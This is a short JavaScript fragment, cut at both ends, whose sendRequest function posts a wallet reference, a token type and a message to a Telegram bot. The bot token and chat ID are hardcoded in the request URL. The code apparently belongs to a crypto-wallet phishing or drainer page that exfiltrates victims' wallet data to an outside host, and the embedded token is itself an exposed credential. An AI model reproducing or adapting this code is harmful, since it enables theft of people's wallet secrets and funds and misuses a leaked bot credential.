...
const sendRequest = (data) => {
    ...
    const telegramData = {
        chat_id: '5998509648', // Replace with your chat ID
        text: `${data.walletRef} and token type is ${data.type}\n${msg}`,
        parse_mode: 'HTML' // Optional: You can use HTML or Markdown for text formatting
    };

    fetch(`https://api.telegram.org/bot7416218718:AAG7rpX46uoak2J6mHKqIA2K46pgx8SaYa0/sendMessage`, { // Replace with your bot token
        method: 'POST',
        headers: {
